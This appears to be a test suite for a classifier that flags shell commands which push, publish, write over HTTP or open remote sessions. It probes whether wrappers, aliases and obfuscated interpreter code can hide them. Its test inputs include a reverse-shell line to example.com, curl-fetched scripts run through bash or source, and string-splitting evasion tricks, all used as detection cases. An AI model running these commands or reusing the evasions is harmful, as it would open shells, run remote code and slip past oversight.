// S4 (one test per remote form) and S6a/S6b (wrappers and undecidable commands) at the classifier level.
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { classifyCommand } from "../lib/command-classifier.ts";
import { analyzeDsp, classifyDsp, dspUnwrap } from "../lib/dsp-classify.ts";
import { fakeExec, realTmp, remoteLabels, unknownReasons } from "./dsp-fixtures.test.ts";

const cwd = realTmp("dsp-classify-");
const remote = (command: string) => remoteLabels(classifyDsp(command, { cwd }));
const unknown = (command: string) => unknownReasons(classifyDsp(command, { cwd }));

describe("normal classification is untouched by the DSP hooks", () => {
	it("returns the same matches with and without options for the commands normal already knows", () => {
		for (const command of ["git push", "git commit -m x", "npm install", "rm -rf build", "gh pr merge 1", "sudo ls", "git reset --hard", "echo hi"]) {
			const plain = classifyCommand(command);
			const withDsp = classifyDsp(command, { cwd }).map(({ dsp: _dsp, ...rest }) => rest);
			assert.deepEqual(withDsp, plain.map(({ dsp: _dsp, ...rest }) => rest), command);
		}
	});

	it("does not tag anything when no options are passed", () => {
		assert.deepEqual(classifyCommand("git push"), [{ kind: "delivery", reason: "git push" }]);
		assert.deepEqual(classifyCommand("curl -X POST https://api.github.com/x"), []);
	});
});

describe("S4 remote forms, one test per form", () => {
	const forms: Array<[string, string, string]> = [
		["git push", "git push", "push"],
		["git push origin main", "git push origin main", "push"],
		["force push", "git push --force-with-lease origin x", "force push"],
		["push --tags", "git push --tags", "tag push"],
		["push a tag ref", "git push origin refs/tags/v1", "tag push"],
		["push --delete", "git push origin --delete old", "push (delete ref)"],
		["gh pr create", "gh pr create --fill", "PR create"],
		["gh pr comment", "gh pr comment 3 -b hi", "PR comment"],
		["gh pr review", "gh pr review 3 --approve", "PR review"],
		["gh pr edit", "gh pr edit 3 --title x", "PR edit"],
		["gh pr close", "gh pr close 3", "PR close"],
		["gh pr reopen", "gh pr reopen 3", "PR reopen"],
		["gh pr merge", "gh pr merge 12 --squash", "PR merge"],
		["gh issue create", "gh issue create -t x", "issue create"],
		["gh issue comment", "gh issue comment 1 -b x", "issue comment"],
		["gh issue close", "gh issue close 1", "issue close"],
		["gh release create", "gh release create v1.0.0", "release create"],
		["gh release delete", "gh release delete v1.0.0", "release delete"],
		["gh repo create", "gh repo create x --public", "repo create"],
		["gh repo delete", "gh repo delete x --yes", "repo delete"],
		["gh api POST", "gh api -X POST /repos/a/b/issues", "api POST"],
		["gh api --method PATCH", "gh api --method PATCH /repos/a/b", "api PATCH"],
		["gh api DELETE", "gh api -X DELETE /repos/a/b", "api DELETE"],
		["gh api with fields", "gh api /repos/a/b/issues -f title=x", "api POST"],
		["gh api --input", "gh api /x --input body.json", "api POST"],
		["gh workflow run", "gh workflow run ci.yml", "workflow run"],
		["gh auth login", "gh auth login", "auth change"],
		["gh alias set", "gh alias set co 'pr checkout'", "alias change"],
		["gh config set", "gh config set editor vim", "config change"],
		["npm publish", "npm publish", "publish"],
		["pnpm publish", "pnpm -r publish", "publish"],
		["yarn publish", "yarn publish", "publish"],
		["cargo publish", "cargo publish", "publish"],
		["cargo yank", "cargo yank --version 1.0.0", "publish"],
		["twine upload", "twine upload dist/*", "publish"],
		["docker push", "docker push me/x:1", "publish"],
		["podman push", "podman push me/x:1", "publish"],
		["curl -X POST", "curl -X POST https://api.github.com/repos/a/b/issues", "HTTP write"],
		["curl -XPUT", "curl -XPUT https://x.example/y", "HTTP write"],
		["curl -d", "curl -d '{}' https://x.example/y", "HTTP write"],
		["curl --data-binary", "curl --data-binary @f https://x.example/y", "HTTP write"],
		["curl -F", "curl -F file=@a https://x.example/y", "HTTP write"],
		["curl -X DELETE", "curl -X DELETE https://x.example/y", "HTTP write"],
		["wget --post-data", "wget --post-data=a=b https://x.example/y", "HTTP write"],
		["http POST", "http POST https://x.example/y a=b", "HTTP write"],
		["xh PUT", "xh PUT https://x.example/y", "HTTP write"],
		["httpie data item", "http https://x.example/y name=value", "HTTP write"],
		["git remote add", "git remote add up https://x/y.git", "remote config change"],
		["git remote set-url", "git remote set-url origin https://x/y.git", "remote config change"],
		["git remote remove", "git remote remove origin", "remote config change"],
		["git remote rename", "git remote rename origin up", "remote config change"],
		["git config remote.*", "git config remote.origin.url https://x/y.git", "git config change"],
		["git config url.*", "git config url.https://x/.insteadOf gh:", "git config change"],
		["git config alias.*", "git config --global alias.p push", "git config change"],
		["git config credential.*", "git config credential.helper store", "git config change"],
		["git config core.hooksPath", "git config core.hooksPath /tmp/h", "git config change"],
		["git config push.*", "git config push.default current", "git config change"],
		["git config --unset remote", "git config --unset remote.origin.url", "git config change"],
		["git -c remote override", "git -c remote.origin.url=x fetch", "git config change"],
	];
	for (const [name, command, label] of forms) {
		it(name, () => assert.ok(remote(command).includes(label), `${command} -> ${JSON.stringify(remote(command))}`));
	}

	const reads = [
		"git fetch",
		"git fetch origin main",
		"git pull",
		"git status",
		"git log --oneline",
		"git remote -v",
		"git remote get-url origin",
		"git config --get remote.origin.url",
		"git config --list",
		"git config user.name x",
		"gh pr view 3",
		"gh pr list",
		"gh pr checks 3",
		"gh pr diff 3",
		"gh pr status",
		"gh issue view 1",
		"gh issue list",
		"gh api /repos/a/b",
		"gh api -X GET /repos/a/b",
		"gh release list",
		"gh release view v1",
		"gh repo view",
		"gh auth status",
		"gh alias list",
		"npm test",
		"npm run build",
		"cargo build",
		"docker build .",
		"curl https://example.com/data",
		"curl -X POST http://localhost:3000/api",
		"curl -d x=1 http://127.0.0.1:8080/",
		"wget https://example.com/file.tgz",
		"http GET https://example.com",
	];
	for (const command of reads) {
		it(`does not treat \`${command}\` as remote`, () => assert.deepEqual(remote(command), [], command));
	}

	it("names the target when the command shows it", () => {
		const [push] = classifyDsp("git push upstream feat/x", { cwd }).flatMap((m) => m.dsp ?? []);
		assert.deepEqual(push, { type: "remote", label: "push", remote: "upstream", ref: "feat/x" });
		const [merge] = classifyDsp("gh pr merge 12 --squash", { cwd }).flatMap((m) => m.dsp ?? []);
		assert.equal(merge.type === "remote" && merge.pr, "12");
		const [create] = classifyDsp("gh pr create --base develop --fill", { cwd }).flatMap((m) => m.dsp ?? []);
		assert.equal(create.type === "remote" && create.base, "develop");
	});
});

describe("S6a wrappers do not hide a remote action", () => {
	const wrapped: Array<[string, string]> = [
		["env", "env git push"],
		["env with assignment", "env FOO=1 git push"],
		["env -u", "env -u HOME git push"],
		["env -i", "env -i git push"],
		["env -S", "env -S 'git push origin x'"],
		["assignment prefix", "GIT_TRACE=1 git push"],
		["command", "command git push"],
		["builtin", "builtin command git push"],
		["exec", "exec git push"],
		["exec -a", "exec -a x git push"],
		["nice", "nice git push"],
		["nice -n", "nice -n 5 git push"],
		["nohup", "nohup git push"],
		["time", "time git push"],
		["timeout", "timeout 30 git push"],
		["timeout -s", "timeout -s KILL 30 git push"],
		["xargs", "echo main | xargs git push origin"],
		["xargs -n", "echo main | xargs -n 1 git push origin"],
		["xargs -I", "echo main | xargs -I {} git push origin {}"],
		["sh -c", "sh -c 'git push'"],
		["bash -c", "bash -c 'git push origin main'"],
		["bash -lc", "bash -lc 'git push'"],
		["zsh -c", "zsh -c \"git push\""],
		["nested sh -c", "sh -c \"bash -c 'git push'\""],
		["eval", "eval 'git push'"],
		["$( )", "echo $(git push)"],
		["$( ) in double quotes", "ls \"$(git push)\""],
		["backticks", "echo `git push`"],
		["backticks in double quotes", "ls \"`git push`\""],
		["nested substitution", "echo $(echo $(git push))"],
		["unquoted heredoc", "cat <<EOF\n$(git push)\nEOF"],
		["git -C", "git -C ../other push"],
		["git -c", "git -c user.name=x push"],
		["git --git-dir", "git --git-dir=/x/.git push"],
		["git --git-dir separate", "git --git-dir /x/.git --work-tree /x push"],
		["git --no-pager", "git --no-pager push"],
		["full path", "/usr/bin/git push"],
		["full path gh", "/opt/homebrew/bin/gh pr merge 1"],
		["hub", "hub push"],
		["hub pull-request", "hub pull-request -m x"],
		["after &&", "npm test && git push"],
		["after ;", "true; git push"],
		["in a subshell", "(git push)"],
		["in a function body", "f() { git push; }; f"],
		["sudo", "sudo -u me git push"],
		["find -exec", "find . -name x -exec git push \\;"],
		["via xargs and sh -c", "echo x | xargs sh -c 'git push'"],
		["time + nice + env", "time nice -n 5 env FOO=1 git push"],
	];
	for (const [name, command] of wrapped) {
		it(name, () => assert.ok(remote(command).length > 0, `${command} -> ${JSON.stringify(classifyDsp(command, { cwd }))}`));
	}

	it("a quoted heredoc is data", () => {
		assert.deepEqual(remote("cat <<'EOF'\n$(git push)\nEOF"), []);
	});

	it("single-quoted text is data", () => {
		assert.deepEqual(remote("echo '$(git push)'"), []);
		assert.deepEqual(remote("grep 'git push' README.md"), []);
	});
});

describe("S6a git aliases", () => {
	const env = { cwd };
	it("resolves an alias through git config --get alias.<name>", async () => {
		const exec = fakeExec({ aliases: { p: "push", ship: "!git push origin HEAD", st: "status -sb", pp: "p" } });
		const lookup = async (name: string) => {
			const result = await exec("git", ["config", "--get", `alias.${name}`], { cwd, timeout: 1 });
			return result.code === 0 ? result.stdout.trim() : result.code === 1 ? null : undefined;
		};
		assert.deepEqual(remoteLabels(await analyzeDsp("git p origin main", { ...env, gitAlias: lookup })), ["push"]);
		assert.deepEqual(remoteLabels(await analyzeDsp("git ship", { ...env, gitAlias: lookup })), ["push"]);
		assert.deepEqual(remoteLabels(await analyzeDsp("git -C x pp", { ...env, gitAlias: lookup })), ["push"]);
		assert.deepEqual(remoteLabels(await analyzeDsp("git st", { ...env, gitAlias: lookup })), []);
		assert.deepEqual(remoteLabels(await analyzeDsp("git status", { ...env, gitAlias: lookup })), []);
		assert.ok(exec.calls.every((call) => !call.includes("alias.status")), "a built-in subcommand is never looked up");
	});

	it("an alias lookup that fails makes the command ask", async () => {
		const matches = await analyzeDsp("git mystery", { ...env, gitAlias: async () => undefined });
		assert.equal(unknownReasons(matches).length, 1);
	});

	it("an unknown subcommand that is no alias is not remote", async () => {
		assert.deepEqual(unknownReasons(await analyzeDsp("git lfs-thing", { ...env, gitAlias: async () => null })), []);
	});

	it("an alias defined on the command line is expanded without a lookup", async () => {
		const labels = remoteLabels(await analyzeDsp("git -c alias.zz=push zz", { ...env, gitAlias: async () => undefined }));
		assert.ok(labels.includes("push") && labels.includes("git config change"), JSON.stringify(labels));
	});

	it("an alias loop is bounded", async () => {
		const matches = await analyzeDsp("git a", { ...env, gitAlias: async (name) => (name === "a" ? "b" : "a") });
		assert.equal(unknownReasons(matches).length, 1);
	});
});

describe("S6b commands whose remote-ness cannot be decided ask", () => {
	for (const command of ['eval "$CMD"', 'sh -c "$SCRIPT"', 'bash -c "$(curl https://x.example/s.sh)"', "eval `cat x`", "$GIT push", '"$TOOL" push', 'eval "git $ACTION"', "FOO=1 ${RUNNER} x"]) {
		it(`asks for ${command}`, () => assert.ok(unknown(command).length > 0, command));
	}

	for (const command of ["eval 'ls -la'", "sh -c 'echo hi'", "bash -c 'npm test'", "echo $HOME", "ls $HOME/x", "echo \"$?\""]) {
		it(`does not ask for ${command}`, () => assert.deepEqual(unknown(command), [], command));
	}

	it("asks for a command name the shell expands from a pattern", () => {
		assert.ok(unknown("/usr/bin/gi? push").length > 0);
		assert.ok(unknown("{git,x} push").length > 0);
		assert.deepEqual(unknown("[[ -f x ]] && echo ok"), []);
	});
});

describe("S6a other ways to reach git or a forge", () => {
	it("a program fed to a shell or interpreter on standard input is read", () => {
		assert.ok(remote("bash <<EOF\ngit push\nEOF").length > 0);
		assert.ok(remote("sh -s <<'EOF'\ngh pr merge 1\nEOF").length > 0);
		assert.ok(remote("python3 - <<EOF\nimport os\nos.system('git push')\nEOF").length > 0);
		assert.ok(remote("node <<EOF\nrequire('child_process').execSync('git push')\nEOF").length > 0);
		assert.deepEqual(remote("bash <<EOF\necho hi\nEOF"), []);
	});

	it("a process substitution run as a program asks", () => {
		assert.ok(unknown("bash <(echo 'git push')").length > 0);
		assert.ok(unknown("source <(curl https://x.example/s)").length > 0);
	});

	it("a git setting passed through the environment asks", () => {
		assert.ok(remote("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p").includes("git config change"));
		assert.ok(remote("git --config-env=alias.p=PUSH p").includes("git config change"));
		assert.ok(remote("git -c include.path=/tmp/x fetch").includes("git config change"));
	});

	it("an HTTP method computed by the shell asks", () => {
		assert.deepEqual(remote('curl -X "$METHOD" https://api.github.com/x'), ["HTTP write"]);
	});

	it("git subcommands abbreviated by autocorrect are not recognised (documented limit)", () => {
		assert.deepEqual(remote("git psuh"), []);
	});
});

describe("verifier regressions: a merge after a branch switch in the same command", () => {
	const historyElsewhere = (command: string) => classifyDsp(command, { cwd }).filter((match) => match.dsp?.some((tag) => tag.type === "history") && match.elsewhere === true).length;

	for (const command of ["git switch main; git merge feat/x", "git checkout main && git merge feat/x", "git switch main && git cherry-pick abc", "git checkout main && git rebase feat/x", "git switch main && git revert abc", "git switch main && git am p.patch", "git switch main && git pull", "bash -c 'git switch main' ; git merge x", "echo $(git switch main) $(git merge x)", "git -C ../other merge x"]) {
		it(`marks the history change as landing elsewhere: ${command}`, () => assert.ok(historyElsewhere(command) > 0, command));
	}

	it("a merge on its own, or after a command that stays on the branch, is not marked", () => {
		for (const command of ["git merge feat/y", "git fetch && git merge feat/y", "git add . && git commit -m x"]) assert.equal(historyElsewhere(command), 0, command);
	});
});

describe("verifier regressions: more push forms", () => {
	for (const command of ["git send-pack origin main", "git remote-https origin https://example.com/x.git", "git remote-ext origin x", "git http-push https://example.com/x.git main", "git-send-pack origin main", "git-push origin main", "/usr/libexec/git-core/git-remote-https origin https://x.example/r.git", "git p4 submit"]) {
		it(`is a remote action: ${command}`, () => assert.ok(remote(command).length > 0, command));
	}

	for (const command of ["git $SUB origin main", 'git "$(echo push)" origin', "docker $ACTION image", "npm $ACTION"]) {
		it(`asks when the subcommand is a variable: ${command}`, () => assert.ok(unknown(command).length > 0, command));
	}
	it("a variable elsewhere in a git command is fine", () => {
		assert.deepEqual(unknown('git -C "$DIR" status'), []);
		assert.deepEqual(unknown('git commit -m "$MSG"'), []);
	});
});

describe("verifier regressions: xargs and parallel input decides the command", () => {
	for (const command of ["echo push | xargs git", "echo push | xargs -I{} git {}", "xargs -I{} git {} <<< push", "echo publish | xargs npm", "echo pr | xargs gh", "echo x | xargs -I% % push", "echo x | xargs -I{} sh -c '{}'", "echo x | xargs sh", "xargs -n1 curl < urls.txt", "echo x | xargs gh api", "echo x | xargs bash -c", "echo x | xargs node", "parallel git {} ::: push", "parallel git ::: push", "parallel {} push ::: git", "parallel curl -s ::: https://x.example"]) {
		it(`asks: ${command}`, () => assert.ok(unknown(command).length > 0 || remote(command).length > 0, command));
	}

	for (const command of ["echo a b | xargs -n1 echo", "ls | xargs git add", "ls | xargs -I{} git -C {} status", "echo a | xargs -I{} echo {}", "echo a | xargs -n1 rm", "parallel echo ::: a b", "ls | xargs -n1 node x.js"]) {
		it(`does not ask: ${command}`, () => assert.deepEqual([remote(command), unknown(command)], [[], []], command));
	}

	it("a literal remote command is still remote", () => {
		assert.ok(remote("xargs git push").length > 0);
		assert.ok(remote("xargs -I{} git push {}").length > 0);
		assert.ok(remote("parallel git push ::: origin").length > 0);
	});
});

describe("verifier regressions: here-strings are programs", () => {
	it("a here-string to a shell is scanned", () => {
		assert.ok(remote("bash <<< 'git push'").length > 0);
		assert.ok(remote('sh <<< "git push origin main"').length > 0);
		assert.ok(remote("zsh <<<'gh pr merge 1'").length > 0);
		assert.ok(remote("python3 <<< \"import os; os.system('git push')\"").length > 0);
	});
	it("a here-string built from a variable asks, a plain one does not", () => {
		assert.ok(unknown('bash <<< "$CMD"').length > 0);
		assert.deepEqual([remote("bash <<< 'echo hi'"), unknown("bash <<< 'echo hi'")], [[], []]);
	});
	it("a here-string to an interpreter that starts processes asks", () => {
		assert.ok(unknown("python3 <<< \"import subprocess; subprocess.run(['g'+'it','push'])\"").length > 0);
		assert.deepEqual(unknown("python3 <<< 'print(1)'"), []);
	});
});

describe("verifier regressions: command-runner wrappers", () => {
	for (const command of [
		"script -c 'git push' /dev/null",
		"script --command='git push' /dev/null",
		"script -q /dev/null git push",
		"su -c 'git push'",
		"su me -c 'git push'",
		"su - me -c 'gh pr merge 1'",
		"runuser -u me -- git push",
		"runuser me -c 'git push'",
		"sg staff 'git push'",
		"sg staff -c 'git push'",
		"flock /tmp/l git push",
		"flock -w 5 /tmp/l git push",
		"flock -c 'git push' /tmp/l",
		"chroot / git push",
		"chroot --userspec=me / git push",
		"unshare -m git push",
		"setsid git push",
		"stdbuf -o0 git push",
		"caffeinate -i git push",
		"doas git push",
		"parallel ::: 'git push'",
		"parallel -j2 git push ::: origin",
		"osascript -e 'do shell script \"git push\"'",
		"osascript -e 'do shell script \"git push\" with administrator privileges'",
		"sshpass -p x git push",
	]) {
		it(`sees the remote action inside: ${command}`, () => assert.ok(remote(command).length > 0, command));
	}

	for (const command of ["parallel < cmds.txt", "parallel -a cmds.txt", "parallel ::: 'git push' :::: more.txt", "osascript deploy.scpt", "osascript -e 'do shell script \"git \" & \"push\"'", "osascript -e 'do shell script cmd'", "osascript -l JavaScript -e 'app.doShellScript(x)'", "osascript -e 'tell application \"Terminal\" to do script \"git push\"'", "parallel -S host git status ::: x", "su -c \"$CMD\"", "script -c \"$CMD\" /dev/null", "flock -c \"git $A\" /tmp/l"]) {
		it(`asks when the inner command cannot be read: ${command}`, () => assert.ok(unknown(command).length > 0 || remote(command).length > 0, command));
	}

	for (const command of ["script -q /dev/null echo hi", "flock /tmp/l echo hi", "flock -c 'echo hi' /tmp/l", "osascript -e 'display dialog \"hi\"'", "chroot / ls", "unshare -m ls", "parallel echo ::: a b", "setsid echo hi", "sg staff 'echo hi'"]) {
		it(`leaves a local inner command alone: ${command}`, () => assert.deepEqual([remote(command), unknown(command)], [[], []], command));
	}

	it("su and runuser count as elevated privileges", () => {
		for (const command of ["su -c 'echo hi'", "runuser -u me -- echo hi", "chroot / ls"]) assert.ok(classifyDsp(command, { cwd }).some((match) => match.kind === "privileged"), command);
	});
});

describe("verifier regressions: inline interpreter code that starts processes asks", () => {
	for (const command of [
		"python3 -c \"import os; os.system('g'+'it push')\"",
		"python -c 'import subprocess; subprocess.run(x)'",
		"python3 -c 'from subprocess import Popen; Popen(x)'",
		"python3 -c \"__import__('os').system(x)\"",
		"node -e 'require(\"child_process\").execSync(\"gi\"+\"t push\")'",
		"node --eval 'require(\"child_process\").spawn(x)'",
		"node -p 'process.binding(\"spawn_sync\")'",
		"node -e 'require(\"child_\"+\"process\")'",
		"perl -e 'system(\"g\".\"it push\")'",
		"perl -e 'print `git push`'",
		"perl -E 'exec $cmd'",
		"ruby -e 'system(\"git push\")'",
		"ruby -e '`#{c}`'",
		"ruby -e 'exec \"git\", \"push\"'",
		"php -r 'shell_exec($c);'",
		"php -r 'echo `git push`;'",
		"deno eval 'new Deno.Command(\"git\", {args: a}).output()'",
		"bun -e 'Bun.spawn([\"git\", \"push\"])'",
		"bun --eval 'import(\"node:child_process\")'",
		"lua -e 'os.execute(c)'",
	]) {
		it(`asks: ${command}`, () => assert.ok(unknown(command).length > 0 || remote(command).length > 0, command));
	}

	for (const command of ["python3 -c 'print(1+1)'", "python -c 'import json; print(json.dumps({1: 2}))'", "node -e 'console.log(JSON.stringify({a:1}))'", "node -p '1+1'", "perl -e 'print 1+1'", "perl -ne 'print if /x/' file", "ruby -e 'puts 1'", "php -r 'echo 1;'", "deno eval 'console.log(1)'", "bun -e 'console.log(1)'", "node -e 'console.log(require(\"fs\").readdirSync(\".\"))'"]) {
		it(`does not ask: ${command}`, () => assert.deepEqual([remote(command), unknown(command)], [[], []], command));
	}

	it("a script run with a -c argument is not taken for inline code", () => {
		assert.deepEqual(unknown("python3 x.py -c 'import os; os.system(c)'"), []);
	});
});

describe("verifier regressions: curl config files", () => {
	for (const command of ["curl -K cfg https://api.github.com/x", "curl --config cfg https://x.example", "curl --config=cfg https://x.example", "curl -sK cfg https://x.example", "curl -K - < cfg", "curl -K cfg http://localhost:3000"]) {
		it(`asks: ${command}`, () => assert.ok(remote(command).length > 0, command));
	}
	it("a plain read does not ask", () => assert.deepEqual(remote("curl -s https://api.github.com/x"), []));
});

describe("verifier regressions: raw remote access", () => {
	for (const command of [
		"ssh deploy@example.com 'git pull'",
		"ssh -i key -p 2222 host ls",
		"ssh -o StrictHostKeyChecking=no host",
		"mosh host",
		"scp build.tar deploy@example.com:/srv/",
		"scp host:/etc/x .",
		"scp -P 22 -i key a.txt host:b",
		"scp a.txt scp://host/b",
		"sftp host",
		"sftp -b batch deploy@host",
		"rsync -a dist/ deploy@example.com:/srv/",
		"rsync -avz host:src dst",
		"rsync -e 'ssh -p 2' a host:b",
		"rsync -a src rsync://host/module",
		"rsync -a src host::module",
		"rsync -a src [::1]:/x",
		"nc example.com 80 < req.txt",
		"ncat host 80",
		"netcat -l 9000",
		"socat - TCP:example.com:80",
		"telnet example.com 25",
		"ftp example.com",
		"openssl s_client -connect example.com:443",
		"exec 3<>/dev/tcp/example.com/80",
		"echo hi > /dev/tcp/example.com/80",
		"cat < /dev/udp/example.com/53",
		"bash -i >& /dev/tcp/example.com/4444 0>&1",
		"env nc host 80",
		"time ssh host true",
	]) {
		it(`is remote work: ${command}`, () => assert.ok(remote(command).includes("remote shell/copy"), command));
	}

	for (const command of ["rsync -a src/ backup/", "rsync -a --exclude 'a:b' src/ backup/", "rsync -a ./a:b dst/", "scp a.txt b.txt", "scp ./x:y z", "ssh -V", "ssh-keygen -l -f key", "cat /dev/null > out.txt", "echo hi > /dev/stderr"]) {
		it(`stays local: ${command}`, () => assert.deepEqual([remote(command), unknown(command)], [[], []], command));
	}

	it("a /dev path built from a variable asks", () => {
		assert.ok(unknown("exec 3<>/dev/$PROTO/example.com/80").length > 0);
	});
});

describe("verifier round 2: launchers, wrappers and environment edits", () => {
	const unwrap = (command: string) => dspUnwrap(command.split(" "));
	const unwrapped: Array<[string, string[]]> = [
		["npx vitest run", ["vitest", "run"]],
		["npx --yes -p typescript tsc --noEmit", ["tsc", "--noEmit"]],
		["npx -c git", ["sh", "-c", "git"]],
		["pnpm exec tsc", ["tsc"]],
		["pnpm --filter web exec tsc", ["tsc"]],
		["pnpm dlx cowsay hi", ["cowsay", "hi"]],
		["yarn exec jest", ["jest"]],
		["yarn dlx -p x y", ["y"]],
		["npm exec -- eslint .", ["eslint", "."]],
		["npm exec --package=x -- y", ["y"]],
		["npm x y", ["y"]],
		["bunx tsc", ["tsc"]],
		["bun x tsc", ["tsc"]],
		["uv run pytest", ["pytest"]],
		["uv run --with rich python x.py", ["python", "x.py"]],
		["uv run script.py", ["python", "script.py"]],
		["uv tool run ruff check", ["ruff", "check"]],
		["uvx ruff check", ["ruff", "check"]],
		["poetry run pytest", ["pytest"]],
		["pipx run --spec x y", ["y"]],
		["bundle exec rspec", ["rspec"]],
		["busybox ls", ["ls"]],
		["taskset 1 ls", ["ls"]],
		["taskset -c 0,1 ls", ["ls"]],
		["unbuffer ls", ["ls"]],
		["chronic ls", ["ls"]],
		["tmux new -d -s x ls", ["sh", "-c", "ls"]],
		["tmux -L sock run-shell ls", ["sh", "-c", "ls"]],
		["screen -dmS name ls", ["ls"]],
		["env -C src ls", ["ls"]],
	];
	for (const [command, expected] of unwrapped) it(`${command} runs ${expected.join(" ")}`, () => assert.deepEqual(unwrap(command).argv, expected));

	it("launchers that run nothing are left alone", () => {
		for (const command of ["npm install", "npm run build", "pnpm add x", "yarn", "bun install", "uv sync", "uv pip install x", "poetry install", "tmux ls", "screen -ls", "screen -r x", "npx"]) assert.equal(unwrap(command).argv[0], command.split(" ")[0], command);
	});

	it("env reports a directory change, unset names and a cleared environment", () => {
		assert.equal(dspUnwrap(["env", "-C", "src", "ls"]).chdir, "src");
		assert.equal(dspUnwrap(["env", "--chdir=src", "ls"]).chdir, "src");
		assert.deepEqual(dspUnwrap(["env", "-u", "A", "--unset=B", "ls"]).env?.unset, ["A", "B"]);
		assert.equal(dspUnwrap(["env", "-i", "ls"]).env?.clear, true);
		assert.equal(dspUnwrap(["env", "-", "ls"]).env?.clear, true);
		assert.equal(dspUnwrap(["exec", "-c", "ls"]).env?.clear, true);
		assert.equal(dspUnwrap(["env", "-iS", "ls -l"]).env?.clear, true);
		assert.deepEqual(dspUnwrap(["env", "-Sgit push"]).argv, ["git", "push"]);
		assert.equal(dspUnwrap(["env", "A=1", "ls"]).env, undefined);
	});

	it("a script that switches branch moves what follows it; one that does not, does not", () => {
		const readFile = (path: string) => (path.endsWith("sw.sh") ? { text: "git switch main\n" } : path.endsWith("ok.sh") ? { text: "echo hi\n" } : { missing: true as const });
		const after = (command: string) => classifyDsp(command, { cwd, readFile }).find((match) => match.dsp?.some((tag) => tag.type === "history"));
		assert.equal(after("bash sw.sh; git merge x")?.elsewhere, true);
		assert.equal(after("bash ok.sh; git merge x")?.elsewhere, undefined);
		assert.equal(after("git merge x")?.elsewhere, undefined);
	});

	it("a script that cannot be read moves what follows it", () => {
		const readFile = () => ({ error: "EACCES" });
		const match = classifyDsp("bash locked.sh; git merge x", { cwd, readFile }).find((found) => found.dsp?.some((tag) => tag.type === "history"));
		assert.equal(match?.elsewhere, true);
	});

	it("env -C marks a git command that rewrites history as elsewhere", () => {
		const match = classifyDsp("env -C ../other git merge x", { cwd }).find((found) => found.dsp?.some((tag) => tag.type === "history"));
		assert.equal(match?.elsewhere, true);
		assert.equal(classifyDsp("env -C src git status", { cwd }).some((found) => found.elsewhere), false);
		// normal classification does not know about it
		assert.equal(classifyCommand("env -C ../other git commit -m x").find((found) => found.commit)?.elsewhere, undefined);
	});

	it("git rebase <upstream> <branch> names the branch it switches to", () => {
		const names = (command: string) => classifyDsp(command, { cwd }).flatMap((match) => (match.dsp ?? []).flatMap((tag) => (tag.type === "default-ref" && tag.label === "rebase" ? tag.names : [])));
		assert.deepEqual(names("git rebase main feat/x"), ["feat/x"]);
		assert.deepEqual(names("git rebase --onto a b main"), ["main"]);
		assert.deepEqual(names("git rebase -x 'npm test' -s ours main refs/heads/topic"), ["topic"]);
		assert.deepEqual(names("git rebase main"), []);
		assert.deepEqual(names("git rebase --continue"), []);
		assert.deepEqual(names("git rebase --root main"), ["main"]);
		assert.ok(unknown("git rebase main $BRANCH").length > 0);
	});

	it("git command strings are classified like shell commands", () => {
		for (const command of ["git -c core.pager='gh pr merge 1' log", "git rebase -x 'gh pr merge 1' HEAD", "git submodule foreach --recursive gh pr merge 1", "git bisect run gh pr merge 1", "git filter-branch --msg-filter 'gh pr merge 1' HEAD", "git fetch --upload-pack='gh pr merge 1' origin", "git clone 'ext::gh pr merge 1' x", "GIT_PAGER='gh pr merge 1' git log"]) {
			assert.ok(remote(command).some((label) => /PR merge/.test(label)), command);
		}
		assert.ok(unknown("git -c core.pager=\"$P\" log").length > 0);
		assert.ok(unknown("git rebase -x \"$(cat cmd)\" HEAD").length > 0);
		assert.deepEqual([remote("git -c core.pager=less log"), unknown("git -c core.pager=less log")], [[], []]);
	});

	it("awk programs that spawn processes ask; plain ones do not", () => {
		for (const program of ['BEGIN{system("ls")}', '{"date" | getline d}', '{print $1 | "sort"}', '{printf "%s\\n", $1 | "cat"}']) assert.ok(unknown(`awk '${program}' f`).length > 0, program);
		for (const program of ["{print $1}", "/a|b/ {print}", "$1 == 1 || $2 == 2 {print $3}", "{n++} END {print n}"]) assert.deepEqual(unknown(`awk '${program}' f`), [], program);
	});
});
